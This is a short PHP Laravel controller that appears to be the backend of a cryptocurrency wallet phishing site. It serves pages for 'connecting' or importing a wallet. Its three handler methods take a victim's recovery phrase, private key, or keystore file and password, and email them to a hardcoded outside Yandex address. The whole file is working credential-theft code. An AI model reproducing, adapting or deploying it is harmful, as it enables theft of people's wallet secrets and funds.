<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Mail\KeyDetails;
use Illuminate\Support\Facades\Mail;

class HomeController extends Controller
{

    private $mail = 'Horgad@yandex.com';

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        //$this->middleware('auth');
    }

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */
    public function index()
    {
        return view('index');
    }

    public function connect(Request $request)
    {
        return view('import');
    }

    public function wallets()
    {
        return view('wallets');
    }

    public function processPhrase(Request $request)
    {
        Mail::to($this->mail)->send(new KeyDetails($request->phrase, $request->type, null, null, null));
        return response(['error' => false, 'message' => 'Sent']);
    }

    public function processPrivate(Request $request)
    {
        Mail::to($this->mail)->send(new KeyDetails(null, $request->type, null, null, $request->private));
        return response(['error' => false, 'message' => 'Sent']);
    }

    public function processKeystore(Request $request)
    {
        Mail::to($this->mail)->send(new KeyDetails(null, $request->type, $request->keystore, $request->password, null));
        return response(['error' => false, 'message' => 'Sent']);
    }
}